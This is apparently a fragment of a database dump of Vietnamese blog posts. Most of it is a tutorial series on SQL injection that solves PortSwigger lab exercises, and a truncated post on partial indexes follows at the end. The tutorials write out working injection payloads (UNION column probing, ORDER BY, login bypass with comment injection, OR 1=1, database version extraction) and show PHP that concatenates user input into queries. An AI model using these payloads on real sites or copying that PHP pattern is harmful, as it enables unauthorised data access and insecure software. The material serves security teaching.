![image.png](https://images.viblo.asia/4df3c89f-64e4-423e-9252-3b9fffbfa269.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm tìm kiếm cột có dữ liệu trả về tương thích với dữ liệu dạng chuỗi (string).

Chúng ta có thể sử dụng chức năng bộ lọc hiển thị sản phẩm theo loại, được xác định qua tham số **`category`** trong thanh URL truyền tới hệ thống qua phương thức GET. Tham số này có thể thay đổi tùy ý. Giá trị này cũng được hiển thị trong giao diện response.

![image.png](https://images.viblo.asia/2746cd80-7b86-4031-b36a-e5b429a77ead.png)

![image.png](https://images.viblo.asia/56a16d7f-31db-411b-8740-db1e7a5745b9.png)

Chúng ta cần giao diện response hiển thi chuỗi **pYazDc**. Kiểm tra lỗ hổng **SQL injection** tại tham số **`category`**:

![image.png](https://images.viblo.asia/c33ba96a-0b21-4da4-b360-cd73a6966365.png)

Xác định số cột dữ liệu truy vấn với lệnh **UNION**:

Payload: **`/filter?category=some-string'' UNION SELECT NULL, NULL, NULL--`** không trả về error.

![image.png](https://images.viblo.asia/028831fb-849d-4b1f-848c-21f5303a39f4.png)

Xác định số cột dữ liệu truy vấn với lệnh **ORDER BY**:

Payload: **`/filter?category=some-string'' ORDER BY 3--`** không trả về error.

![image.png](https://images.viblo.asia/25e10d4d-6fd5-4b30-9032-e891d6ba62d5.png)

Payload: **`/filter?category=some-string'' ORDER BY 4--`** trả về error.

![image.png](https://images.viblo.asia/42aa8208-1e28-473b-ac6f-13cbd6e00b0a.png)

Như vậy câu lệnh truy vấn trả về $3$ cột dữ liệu. Tiếp theo, chúng ta cần xác định cột dữ liệu nào sẽ tương thích với kiểu dữ liệu chuỗi (string).

Kiểm tra kiểu dữ liệu trả về trong cột $1$. Payload: **`/filter?category=some-string'' UNION SELECT ''column1'', NULL, NULL--`** trả về error:

![image.png](https://images.viblo.asia/b3257cbd-6a42-4600-bceb-8b78a1e65e32.png)

Kiểm tra kiểu dữ liệu trả về trong cột $1$. Payload: **`/filter?category=some-string'' UNION SELECT NULL, ''column2'', NULL--`** trả về chuỗi **column2** trong giao diện:

![image.png](https://images.viblo.asia/39c3f970-a86d-4060-90ad-4561aaa28972.png)

Như vậy dữ liệu trong cột $2$ tương thích với kiểu dữ liệu string. Hiển thị chuỗi **pYazDc** trong giao diện. Payload: **`/filter?category=some-string'' UNION SELECT NULL, ''pYazDc'', NULL--`**

![image.png](https://images.viblo.asia/155b0e52-6cd2-4b44-907e-9a0951369108.png)

Bài lab được giải quyết!

### 5. Khai thác lỗ hổng SQL injection - Truy xuất dữ liệu trong các bảng (database tables)

Sau khi xác nhận chính xác số lượng cột dữ liệu trả về trong câu truy vấn và cột dữ liệu có thể thực hiện khai thác (trả về thông tin, thường là kiểu string), chúng ta có thể bắt đầu thực hiện thu thập dữ liệu.

#### 5.1. Kiểm tra kiểu và phiên bản hiện hành của hệ cơ sở dữ liệu

Trước khi đi vào khai thác dữ liệu, chúng ta nên thu thập các thông tin liên quan tới mục tiêu, càng nắm bắt được nhiều thông tin, khả năng tấn công thành công sẽ càng cao. Một trong những thông tin cần xác nhận đầu tiên chính là kiểu và phiên bản hệ cơ sở dữ liệu. Tất nhiên rồi, mỗi hệ cơ sở dữ liệu có các cú pháp truy vấn khác nhau, đây là một thông tin rất quan trọng giúp cho bước xây dựng payload sau đó.

Đối với mỗi hệ quản trị cơ sở dữ liệu được hệ thống sử dụng, các câu truy vấn phiên bản hiện tại cũng có sự khác nhau, chúng ta cùng tham khảo một vài cú pháp đối với các loại database:

|Database type|Query|
|-|-|
|Microsoft, MySQL|SELECT @@version|
|Oracle|SELECT * FROM v$version|
|PostgreSQL|SELECT version()|

Các cú pháp chi tiết hơn có thể xem thêm tại [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

Xét câu truy vấn sau:

**`SELECT name, description FROM products WHERE category = ''Gifts''`**

Tham số **`category`** có thể thay đổi bởi người dùng, giả sử chúng ta đã biết câu truy vấn trả về $2$ cột dữ liệu, và cả $2$ cột này đều tương thích với kiểu dữ liệu string. Chẳng hạn, hệ quản trị cơ sở dữ liệu trang web đang sử dụng là **Microsoft SQL** thì chúng ta có thể thay đổi giá trị **`category='' UNION SELECT NULL, @@version--`** để truy xuất thông tin phiên bản cơ sở dữ liệu hiện hành. Cụ thể hơn, chúng ta cùng phân tích kỹ hơn cách truy xuất này trong một vài lab sau:

#### Phân tích lab **[SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)**

![image.png](https://images.viblo.asia/961c57c7-1762-4ef3-8cc8-77db0841ee5a.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm hiển thị phiên bản hiện tại hệ quản trị cơ sở dữ liệu **Oracle** trong giao diện trang web.

Kiểm tra lỗ hổng **SQL injection** tại tham số **`category`**, payload: **`/filter?category='' OR 1=1--`**:

![image.png](https://images.viblo.asia/bdba1ce1-6b6d-4dc6-9abd-2067ebb14e1d.png)

Kiểm tra số cột dữ liệu trả về trong câu lệnh truy vấn, payload: **`/filter?category='' ORDER BY 2--`** không xuất hiện error và payload: **`/filter?category='' ORDER BY 3--`** xuất hiện error:

![image.png](https://images.viblo.asia/eef9286a-020b-4171-8f7e-07f2d26a2952.png)

![image.png](https://images.viblo.asia/f264c53f-a017-4fb9-9f8a-0a209e76e3fa.png)

Như vậy câu truy vấn trả về $2$ cột dữ liệu. Tiếp theo tìm kiếm cột dữ liệu tương thích với kiểu chuỗi, payload: **`/filter?category='' UNION SELECT ''column1'', ''column2'' FROM dual--`**

![image.png](https://images.viblo.asia/7e6a75d6-651d-4898-8ebe-766f856eef5b.png)

Cả $2$ cột dữ liệu đều có thể tận dụng để hiển thị thông tin khai thác. Thực hiện truy xuất phiên bản cơ sở dữ liệu hiện tại, payload: **`/filter?category='' UNION SELECT banner, ''column2'' FROM v$version--`**, bài lab hoàn thành:

![image.png](https://images.viblo.asia/d4e98420-1df4-48f8-9765-aa57b9906444.png)

#### Phân tích lab **[SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)**

![image.png](https://images.viblo.asia/787bfded-cac4-444c-864f-b84e521429ae.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm truy xuất phiên bản hiện tại hệ quản trị cơ sở dữ liệu trong giao diện trang web, biết rằng hệ thống sử dụng **MySQL** hoặc **Microsoft**.

Kiểm tra lỗ hổng **SQL injection** tại tham số **`category`**, payload **`/filter?category='' OR 1=1--`** và **`/filter?category='' OR 1=1--+`**

![image.png](https://images.viblo.asia/21e446c8-5da1-43fc-8916-cfef18e9c2e8.png)

![image.png](https://images.viblo.asia/bc6b8fef-073a-4c42-b742-9060fadb3b5e.png)

Như vậy hệ thống sử dụng hệ quản trị cơ sở dữ liệu **MySQL** với ký tự comment là **`-- `** (lưu ý kết thúc bằng khoảng trắng).

Kiểm tra số cột dữ liệu trả về trong câu truy vấn, payload: **`/filter?category='' UNION SELECT NULL, NULL--+`**

![image.png](https://images.viblo.asia/4210acf0-eba0-4d68-ac12-4411e6e4a88f.png)

Như vậy câu lệnh truy vấn trả về $2$ cột dữ liệu. Tiếp theo tìm kiếm cột dữ liệu tương thích với kiểu chuỗi, payload: **`/filter?category='' UNION SELECT ''column1'', ''column2''--+`**

![image.png](https://images.viblo.asia/7a3ea676-70b8-4c68-bbd7-5a916ec1bd44.png)

Cả hai cột dữ liệu đều có thể tận dụng để hiển thị thông tin khai thác. Cuối cùng, truy xuất thông tin phiên bản hiện tại của hệ quản trị cơ sở dữ liệu **MySQL**, payload: **`/filter?category='' UNION SELECT @@version, NULL--+`**, bài lab hoàn thành:

![image.png](https://images.viblo.asia/c115a1d8-02e6-4c1c-ab11-65d985b2baf4.png)', '2023-02-06T06:04:28.000000Z', '2023-02-22T04:28:01.000000Z', '2023-02-01T06:35:17.000000Z'),
	('SQL injection vulnerabilities (Phần 2)', '38X4E5nX4N2', '8', 'public', 'https://images.viblo.asia/da58cf52-c658-4714-b2ed-72c85ab4f843.png', 'II. Phân tích và khai thác các lỗ hổng SQL Injection (tiếp)

3. Phá vỡ logic ứng dụng

Xét một chức năng đăng nhập:

Khi người dùng thực hiện đăng nhập, hai tham số username và password được truyền tới hệ thống, sau đó được "ghép" trực tiếp vào câu lệnh SQL. Ví dụ câu lệnh kiểm tra thông tin đăng nhập của người dùng trong ngôn ngữ php như sau:

Giả sử chúng ta đã biết tên đăng nhập của victim l...', '## II. Phân tích và khai thác các lỗ hổng SQL Injection (tiếp)

### 3. Phá vỡ logic ứng dụng

Xét một chức năng đăng nhập:

![image.png](https://images.viblo.asia/cbdc47a5-4c3a-4675-b1a8-8488df49b39b.png)

Khi người dùng thực hiện đăng nhập, hai tham số **`username`** và **`password`** được truyền tới hệ thống, sau đó được "ghép" trực tiếp vào câu lệnh SQL. Ví dụ câu lệnh kiểm tra thông tin đăng nhập của người dùng trong ngôn ngữ **php** như sau:

```php
$username = $_POST[''username''];
$password = $_POST[''password''];
$sql = "SELECT * FROM users WHERE username = ''" . $username . "'' AND password = ''" . $password . "''";
```

Giả sử chúng ta đã biết tên đăng nhập của victim là **`victim`**, cần tìm cách thay đổi logic câu lệnh trên sao cho khi thực thi thì hệ thống không kiểm tra mật khẩu (do chúng ta không có thông tin mật khẩu). Từ ý tưởng đó, thực hiện thay đổi giá trị **`username`** thành **`victim''--`**, tham số còn lại nhận giá trị tùy ý. Câu lệnh trở thành:

**`SELECT * FROM users WHERE username = ''victim''--'' AND password = ''123''`**

Lúc này hệ thống chỉ thực hiện lấy thông tin từ cơ sở dữ liệu với một điều kiện duy nhất là **`username = ''victim''`**, điều này luôn thực hiện được nên chúng ta có thể đăng nhập thành công!

Xem xét một cách khai thác khác: thay đổi giá trị **`password`** thành **`123'' or 1=1--`**. Khi đó câu lệnh trở thành:

**`SELECT * FROM users WHERE username = ''victim'' AND password = ''123'' or 1=1--''`**

Lúc này khi kiểm tra mật khẩu người dùng **`victim`** thì điều kiện logic **`password = ''123'' or 1=1--`** luôn đúng nên chúng ta cũng có thể đăng nhập vào tài khoản victim.

#### Phân tích lab **[SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)**

![image.png](https://images.viblo.asia/4d275696-571a-4f55-b154-6887777f6640.png)

**Miêu tả:** Chức năng đăng nhập của trang web chứa lỗ hổng SQL injection. Chúng ta cần khai thác lỗ hổng để truy cập vào tài khoản **`administrator`**.

Kiểm tra lỗ hổng SQL injection bằng cách thêm một dấu **`''`** trong trường **username**, trang web xuất hiện lỗi:

![image.png](https://images.viblo.asia/136b4015-3b54-4a24-8816-9d776f925b4e.png)

![image.png](https://images.viblo.asia/2e2f180d-8e1c-4084-aa75-07c58cb89d12.png)

Có thể dự đoán lỗi xuất hiện là do câu lệnh truy vấn bị sai cú pháp. Hiện tại chúng ta đã biết username của quản trị viên là **`administrator`**. Như phân tích phía trên, chúng ta có thể phá vỡ logic câu lệnh SQL bằng cách thay đổi giá trị **`username`** thành **`administrator''--`**, còn **`password`** nhận giá trị tùy ý. Câu lệnh trở thành:

**`SELECT * FROM users WHERE username = ''administrator''--'' AND password = ''123''`**

Lúc này hệ thống chỉ thực hiện lấy thông tin từ cơ sở dữ liệu với một điều kiện duy nhất là **`username = ''administrator''`**, điều này luôn thực hiện được nên chúng ta đăng nhập thành công!

![image.png](https://images.viblo.asia/7e469b78-ceff-4834-844a-fa5bb19d2bb8.png)

![image.png](https://images.viblo.asia/28237b92-0f6a-4b1b-9c4d-52ca5a6e3292.png)

### 4. Khai thác lỗ hổng SQL injection - Thu thập thông tin câu truy vấn

Khi chúng ta đã xác nhận điểm chứa lỗ hổng **SQL injection** và kết quả được trả về  chúng ta có thể tiếp tục khai thác các thông tin dữ liệu từ các bảng trong cơ sở dữ liệu. Giả sử câu truy vấn được hệ thống sử dụng ở đây là:

**`SELECT name, description FROM products WHERE category = ''Gifts''`**

Ở đây tham số **`category`** có thể thay đổi bởi người dùng, đồng thời đã biết tên bảng cần khai thác là **users**, nên chúng ta có thể tận dụng phép **UNION** để truy xuất dữ liệu từ bảng **users** như sau:

**`SELECT name, description FROM products WHERE category = ''Gifts'' UNION SELECT username, password FROM users--`**

Vậy thì, phép **UNION** là gì? Xét cú pháp sử dụng **UNION** trong câu truy vấn sau:

**`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`**

Câu truy vấn thực hiện lấy dữ liệu từ cột **a**, **b** trong bảng **table1** và dữ liệu từ cột **c**, **d** trong bảng **table2**, sau đó "hợp" dữ liệu lấy từ bảng **table2** vào dữ liệu lấy từ bảng **table1**. Cụ thể, xét hai bảng:

- Bảng **people**:

|id|name|
|-|-|
|1|Binh|
|2|Son|

- Bảng **fruit**:

|id|fruit|
|-|-|
|1|apple|
|2|watermelon|

Câu truy vấn **`SELECT name FROM people UNION SELECT fruit FROM fruit`** trả về kết quả như sau:

|name|
|-|
|apple|
|Binh|
|Son|
|watermelon|

Và để thực hiện lệnh truy vấn với **UNION** chúng ta cần chú ý tới hai điều kiện sau cần được thỏa mãn:

- Các câu lệnh **SELECT** cần trả về số cột dữ liệu bằng nhau.
- Các cột tương ứng cần có cùng kiểu dữ liệu.

Như vậy, trong quá trình khai thác lỗ hổng **SQL injection** có kết hợp phép **UNION**: để thỏa mãn điều kiện $1$, chúng ta cần xác định số cột dữ liệu trả về trong câu lệnh truy vấn hệ thống sử dụng; để thỏa mãn điều kiện $2$, chúng ta cần tìm kiếm cột dữ liệu tương thích với kiểu dữ liệu chúng ta cần truy xuất (thường là kiểu string).

#### 4.1. Xác định số cột dữ liệu trả về trong câu truy vấn

Xét câu truy vấn trả về $2$ cột dữ liệu như sau:

**`SELECT name, description FROM products WHERE category = ''gift''`**

- Cách 1: sử dụng phép **UNION**

Thay đổi giá trị tham số **`category`** lần lượt là:

**`'' UNION SELECT NULL--`**
**`'' UNION SELECT NULL, NULL--`**
**`'' UNION SELECT NULL, NULL, NULL--`**
...

Lí do chúng ta sử dụng kiểu dữ liệu **NULL** là vì kiểu **MULL** có thể tự chuyển hóa thành bất kỳ kiểu dữ liệu nào khác trong quá trình "hợp" kết quả. Do điều kiện $1$ trong phép **UNION** nên với các trường hợp có số lượng từ khóa **NULL** khác $2$ sẽ trả về error trong giao diện. Bằng cách thử này chúng ta có thể xác định số cột dữ liệu trả về trong câu truy vấn là $2$.

- Cách 2: sử dụng phép **ORDER BY**

Phép **ORDER BY** thực hiện sắp xếp kết quả truy vấn theo điều kiện đưa ra. Trong trường hợp này, chúng ta cần lợi dụng nó để xác định số cột dữ liệu trả về trong câu truy vấn. Xét câu truy vấn như sau:

**SELECT name, description FROM products WHERE category = ''gift'' ORDER BY 1**

Kết quả câu truy vấn trên sẽ sắp xếp dữ liệu trả về theo cột số $1$ - cột **name**. Tương tự, nếu sử dụng **ORDER BY 2** sẽ sắp xếp cột dữ liệu theo cột số $2$ - cột **description**. Như vậy, chúng ta có thể thay đổi giá trị tham số **category** lần lượt là:

**`'' ORDER BY 1--`**
**`'' ORDER BY 2--`**
**`'' ORDER BY 3--`**
...

Cho tới khi câu truy vấn không tìm thấy cột thứ $i$, sẽ trả về error, điều này cũng đồng nghĩa với cột có số thứ tự lớn nhất là $i-1$, hay câu truy vấn trả về $i-1$ cột dữ liệu.

#### Phân tích lab **[SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)**

![image.png](https://images.viblo.asia/bc1ec1ad-ef6d-496f-8ffb-713f616965e2.png)

**Miêu tả:** Trang web chứa lỗ hổng **SQL injection** trong chức năng bộ lọc hiển thị sản phẩm. Chúng ta có thể xác định số cột dữ liệu được trả về trong câu truy vấn. Để giải quyết bài lab, chúng ta cần sử dụng query **UNION** xác định số cột dữ liệu trả về bằng cách gộp các cột dữ liệu này với null.

![image.png](https://images.viblo.asia/9735586c-fc0b-4073-8baf-7af02262cfed.png)

Chúng ta có thể sử dụng chức năng bộ lọc hiển thị sản phẩm theo loại, được xác định qua tham số **`category`** trong thanh URL truyền tới hệ thống qua phương thức GET. Tham số này có thể thay đổi tùy ý. Giá trị này cũng được hiển thị trong giao diện response.

Kiểm tra lỗ hổng **SQL injection** bằng cách thay đổi giá trị **`category=''`**, giao diện trả về error.

![image.png](https://images.viblo.asia/d7c07359-7fdd-49a3-ba28-8b13369b781e.png)

Có thể dự đoán lỗi xuất hiện là do câu lệnh truy vấn bị sai cú pháp. Bắt đầu kiểm tra với payload như sau:

Câu truy vấn trả về $1$ cột: **`/filter?category=Lifestyle'' UNION SELECT NULL--`**

![image.png](https://images.viblo.asia/4f4aeb9d-a213-4ebe-a9f3-5c9a27e1c362.png)

Câu truy vấn trả về $2$ cột: **`/filter?category=Lifestyle'' UNION SELECT NULL, NULL--`**

![image.png](https://images.viblo.asia/a856d888-8018-48fb-bfd1-d2942dacbdd1.png)

Câu truy vấn trả về $3$ cột: **`/filter?category=Lifestyle'' UNION SELECT NULL, NULL, NULL--`**

![image.png](https://images.viblo.asia/da58cf52-c658-4714-b2ed-72c85ab4f843.png)

Tại payload kiểm tra số cột dữ liệu trả về là $3$, giao diện phản hồi không còn lỗi xuất hiện, như vậy câu truy vấn dữ liệu trả về $3$ cột và bài lab được giải quyết.', '2023-02-06T06:04:21.000000Z', '2023-02-24T22:41:01.000000Z', '2023-02-01T06:34:08.000000Z'),
	('SQL injection vulnerabilities (Phần 1)', '3RlL5A2wLbB', '9', 'public', 'https://images.viblo.asia/df467d0b-88a9-42c5-8471-eba3202a7fb4.png', 'I. Đặt vấn đề
1. Giới thiệu

Một vấn đề lớn mà mỗi một hệ thống cần phải đối mặt đó chính là làm sao để lưu trữ các thông tin một cách hiệu quả và khi cần sử dụng có thể truy xuất nhanh chóng và chính xác. Từ đó, cơ sở dữ liệu (Database) ra đời, nó là một hệ thống bao gồm rất nhiều thông tin, dữ liệu được xây dựng theo một cấu trúc nhất định nhằm đáp ứng nhu cầu khai thác, sử dụng đồng thời của...', '## I. Đặt vấn đề
### 1. Giới thiệu

Một vấn đề lớn mà mỗi một hệ thống cần phải đối mặt đó chính là làm sao để lưu trữ các thông tin một cách hiệu quả và khi cần sử dụng có thể truy xuất nhanh chóng và chính xác. Từ đó, **cơ sở dữ liệu (Database)** ra đời, nó là một hệ thống bao gồm rất nhiều thông tin, dữ liệu được xây dựng theo một cấu trúc nhất định nhằm đáp ứng nhu cầu khai thác, sử dụng đồng thời của nhiều người hay nhiều chương trình ứng dụng. Không chỉ giúp khắc phục được những điểm yếu của việc lưu file thông thường trên máy tính, cơ sở dữ liệu còn đảm bảo thông tin lưu trữ được nhất quán, hạn chế tình trạng trùng lặp thông tin. Là nơi lưu trữ hầu như các thông tin dữ liệu quan trọng nhất của hệ thống, nên cơ sở dữ liệu thường là mục tiêu tấn công đầu tiên của kẻ xấu.

![image.png](https://images.viblo.asia/df467d0b-88a9-42c5-8471-eba3202a7fb4.png)

Trong môn học cơ sở dữ liệu, chúng ta được học về các mô hình database, đồng thời được thực hành sử dụng các câu lệnh **SQL (Structured Query Language)** nhằm truy xuất dữ liệu từ database. **SQL Injection** (thường được gọi tắt là SQLi) chính là một dạng tấn công trực tiếp can thiệp vào các câu lệnh truy vấn dữ liệu từ trang web tới cơ sở dữ liệu, qua đó có thể chỉnh sửa ý nghĩa câu truy vấn nhằm thực hiện mục đích xấu.

![image.png](https://images.viblo.asia/75b974f8-6b01-4f62-b9a0-42df91c46a12.png)

Lỗ hổng SQL Injection thường dẫn tới việc lộ thông tin nhạy cảm người dùng, dữ liệu cá nhân có nguy cơ bị sử dụng trái phép, kẻ xấu có thể truy cập vào các tài khoản có quyền hạn cao, hệ thống có nguy cơ bị mất quyền kiểm soát. Dạng lỗ hổng Injection được xếp vị trí đầu tiên trong Top $10$ lỗ hổng bảo mật web của OWASP vào năm $2017$, và SQL injection là dạng tấn công phổ biến nhất! (Thậm chí tới năm $2021$ dạng lỗ hổng Injection vẫn được xếp ở vị trí số $7$ ) Các lỗ hổng SQL injection thường được đánh giá mức độ nghiêm trọng ở dạng High và đã gây ra thiệt hại rất lớn cho các nhà phát triển cũng như doanh nghiệp.

![image.png](https://images.viblo.asia/e38ed592-c9a4-4aa8-8ccb-06c9c1c44dec.png)

### 2. Kiến thức cần chuẩn bị

Với công nghệ tiên tiến hiện nay đã phát triển thành công nhiều hệ quản trị cơ sở dữ liệu khác nhau, có thể kể đến như **MYSQL, MariaDB, Oracle, PostgreSQL, Microsoft SQL Server, ...**, mỗi hệ có những ưu, nhược điểm riêng. Tất nhiên các câu lệnh truy xuất đối với mỗi hệ quản trị cơ sở dữ liệu cũng khác nhau, dẫn tới các hình thức, payload tấn công cũng đa dạng và luôn cần thay đổi linh hoạt. Ở đây tôi sẽ sử dụng cơ sở dữ liệu **MYSQL** làm ví dụ cho kiến thức cần chuẩn bị. Khi gặp các trường hợp cơ sở dữ liệu khác, các bạn có thể xây dựng các payload cho mình một cách tương tự, hoặc có thể tham khảo tại [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection).

![image.png](https://images.viblo.asia/19fdfc88-6ad0-45cb-aad7-88cdf0dc7829.png)

Trước hết, chúng ta cần biết tới **INFORMATION_SCHEMA** trong MySQL - là một cơ sở dữ liệu thông tin, tại đây lưu trữ thông tin các cơ sở dữ liệu khác của MySQL. Trong cơ sở dữ liệu thông tin này có nhiều bảng và view, tuy nhiên có lẽ hay sử dụng nhiều nhất là các bảng **TABLES** - chứa tất cả thông tin về các bảng, **COLUMNS** - chứa tất cả các thông tin về các cột của các bảng, **USER_PRIVILEGES** - chứa tất cả các thông tin về quyền truy cập của các người dùng đối với mỗi cơ sở dữ liệu.

Để truy xuất các thông tin mong muốn, chúng ta cần xác định tên cơ sở dữ liệu (database name), tên bảng (table name), tên cột (column name) cũng như các điều kiện cần thỏa mãn. Bởi vậy chúng ta cần nắm vững kiến thức các câu lệnh truy vấn đối với từng hệ quản trị cơ sở dữ liệu khác nhau để có thể thực hiện khai thác tối đa đối với dạng lỗ hổng SQL Injection.

## II. Phân tích và khai thác các lỗ hổng SQL Injection

### 1. Nguyên nhân xuất hiện lỗ hổng SQL Injection

Hệ thống thực hiện lưu thông tin người dùng vào cơ sở dữ liệu, khi cần hiển thông các thông tin cho người dùng, các câu lệnh truy xuất dữ liệu từ database sẽ được thực thi. Chẳng hạn khi người dùng nhập vào ô tìm kiếm dữ liệu "linh", lúc này hệ thống cần lấy tất cả thông tin của người dùng có **name = linh**, đoạn mã thực thi được sử dụng trong hệ quản trị cơ sở dữ liệu **MYSQL** và ngôn ngữ **PHP** như sau:

```php
$input = $_GET[''search''];
$sql = "SELECT * FROM student WHERE name = ''" . $input ."''";
$result = mysql_query($sql);
```

Biến `$input` nhận giá `linh`, sau khi ghép chuỗi thì chuỗi `$sql = "SELECT * FROM student WHERE name = ''linh''"`, khi thực thi qua hàm `mysql_query()` sẽ có thể truy xuất kết quả. Tuy nhiên, chú ý rằng giá trị biến `$input` có thể thay đổi bởi người dùng, nếu không thực hiện các cơ chế phòng ngừa tấn công, kẻ xấu có thể nhập giá trị `linh''` cho biến này, dẫn tới câu lệnh truy vấn trở thành:

**`SELECT * FROM student WHERE name = ''linh''''"`**

Và khi thực thi sẽ gây ra lỗi do thừa một dấu `''`. Lúc này chắc hẳn có nhiều bạn thắc mắc việc gây ra lỗi như này có tác dụng gì? Câu trả lời tất nhiên là có, vì chúng ta có thể sử dụng dấu `''` nhằm "đóng" giá trị `name` phía trước đi, hoặc kết thúc câu lệnh truy vấn này, sau đó sẽ có thể ghép nối tất cả mọi thứ mình mong muốn, chỉ cần thỏa mãn cấu trúc lệnh truy vấn. Tuy nhiên, còn một vấn đề cuối cùng nữa, đó là vì cuối câu lệnh luôn được ghép một dấu `''`, hoặc trong các trường hợp có thể phía sau còn một phần câu lệnh truy vấn thì xử lý như thế nào? Yên tâm vì chúng ta có thể giải quyết vấn đề này đơn giản bằng cách sử dụng các ký tự comment trong MYSQL như `-- ` (chú ý có một dấu khoảng trống phía sau), `#`, `/* */` để biến các chuỗi "dư thừa" trở thành phần comment.

### 2. Truy xuất các dữ liệu hiển thị trái phép

Ví dụ trong một trang web mua sắm trực tuyến, người dùng có thể xem các dòng sản phẩm theo tham số **`category`**:

**`https://insecure-website.com/products?category=Gifts`**

Và khi hệ thống thực hiện truy xuất các sản phẩm từ cơ sở dữ liệu sẽ sử dụng thêm điều kiện **`released = 1`** chỉ lấy các dòng sản phẩm đang phát hành:

**`SELECT * FROM products WHERE category = ''Gifts'' AND released = 1`**

Do giá trị tham số **`category`** có thể thay đổi tùy ý nên chúng ta có thể lợi dụng kỹ thuật tấn công SQL injection khiến trang web hiển thị thêm các dòng sản phẩm đã dừng phát hành hoặc sẽ phát hành trong tương lai. Xem xét một số cách tấn công như sau:

- **`https://insecure-website.com/products?category=Gifts''--`**

Lúc này câu truy vấn trở thành:

**`SELECT * FROM products WHERE category = ''Gifts''-- AND released = 1`**

Ký hiệu **`--`** đã khiến phần theo sau nó được hệ thống hiểu là comment nên đã vô hiệu hóa điều kiện **`released = 1`**, khiến hệ thống lấy dữ liệu tất cả sản phẩm chỉ cần thỏa mãn điều kiện **`category = ''Gifts''`**, trong đó bao gồm các sản phẩm **`released = 1`** và **`released = 0`**.

* **`https://insecure-website.com/products?category=Gifts'' OR 1=1--`**

Lúc này câu truy vấn trở thành:

**`SELECT * FROM products WHERE category = ''Gifts'' OR 1=1--'' AND released = 1`**

Khi đó hệ thống kiểm tra điều kiện **`category = ''Gifts'' OR 1=1`** là một điều kiện luôn đúng (logic trong Đại số). Bởi vậy tất cả sản phẩm đều được hiển thị!

#### Phân tích lab **[SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)**

![image.png](https://images.viblo.asia/dea983f6-5c4a-45c8-b763-333bc32f3db8.png)

**Miêu tả:** Trang web chứa lỗ hổng SQL injection trong câu lệnh truy xuất dữ liệu. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng để giao diện web hiển thị tất cả sản phẩm bao gồm cả phát hành và chưa phát hành.

![image.png](https://images.viblo.asia/9588f773-7ad7-442a-96fa-70e2a1548e71.png)

Chúng ta có thể xem các sản phẩm theo từng thể loại. Để ý rằng trang web xác định các dòng sản phẩm theo tham số **`category`** trong thanh URL, giá trị này có thể thay đổi tùy ý.

Kiểm tra lỗ hổng SQL injection, thêm một dấu **`''`** chúng ta thấy trang web xuất hiện lỗi:

**`/filter?category=Lifestyle''`**

![image.png](https://images.viblo.asia/e1e48668-a740-4540-bac5-55794dd80b50.png)

Có thể dự đoán lỗi xuất hiện là do câu lệnh truy vấn bị sai cú pháp như đã phân tích phía trên. Thực hiện tấn công SQL injection, chúng ta chỉ cần thay đổi giá trị **`category`** kết hợp với một biểu thức logic luôn đúng sẽ dẫn tới hệ thống truy xuất tất cả sản phẩm trong cơ sở dữ liệu:

**`/filter?category=Lifestyle'' or 1=1--`**

Bài lab được giải quyết:

![image.png](https://images.viblo.asia/1cb3df2d-5d39-4e27-9f37-0d7027a7de17.png)', '2023-02-06T06:04:00.000000Z', '2023-02-28T02:05:03.000000Z', '2023-02-01T06:29:11.000000Z'),
	('Tăng tốc database phần 14 Partial Indexes', 'bXP4WA1KL7G', '10', 'public', '', 'Thường thì chúng ta index sẽ hiểu là tất cả các dòng của cột đều được đánh index, nhưng trong một số trường hợp ta chỉ muốn đánh index theo một điều kiện nào đó. Một số hệ quản trị cung cấp chúng ta một tiện ích gọi là partial (PostgreSQL) or filtered (SQL Server).

Nhưng tại sao phải index theo điều kiện, index hết không phải hơn à? Thường thì index theo điều kiện này thường dùng cho các trườn...', 'Thường thì chúng ta index sẽ hiểu là tất cả các dòng của cột đều được đánh index, nhưng trong một số trường hợp ta chỉ muốn đánh index theo một điều kiện nào đó. Một số hệ quản trị cung cấp chúng ta một tiện ích gọi là partial (PostgreSQL) or filtered (SQL Server).

Nhưng tại sao phải index theo điều kiện, index hết không phải hơn à? Thường thì index theo điều kiện này thường dùng cho các trường hợp điều kiên where chứa các hằng số, như trang thái (status code, status)...

```
SELECT message
  FROM messages
 WHERE processed = ''N''
   AND receiver  = ?
```

Những truy vấn như trên rất hay gặp trong hệ thống queue. Truy vấn tìm  tất cả các tin nhắn(message) chưa qua xử lý (processed = ''N'') cho một người nhận cụ thể (receiver).  Những message  đã xử lý thì không cần phải query lắm. Nếu cần thì những message lấy cũng chiếm phần lớn số lượng của bảng nên việc index sẽ không có độ selectivity cao nên cũng không hiệu quả.

Thông thường chúng ta sẽ tạo index như sau:

```
CREATE INDEX messages_todo
          ON messages (receiver, processed)
```

Index như vậy đáp ứng được yêu cầu, tuy nhiên nó bao gồm cả những row mà ít khi query đến (Những dòng có trạng thái đã xử lý) và tốn ổ cứng để lưu dữ liệu index cho những bản ghi này, đôi khi tốn hơn rất nhiều dung lượng cần thiết cho những bản ghi cần truy vấn.

Với partial indexing  ta có thể giới hạn được số lượng bản ghi cần được index. Cú pháp thì rất đơn giản như sau:

```
CREATE INDEX messages_todo
          ON messages (receiver)
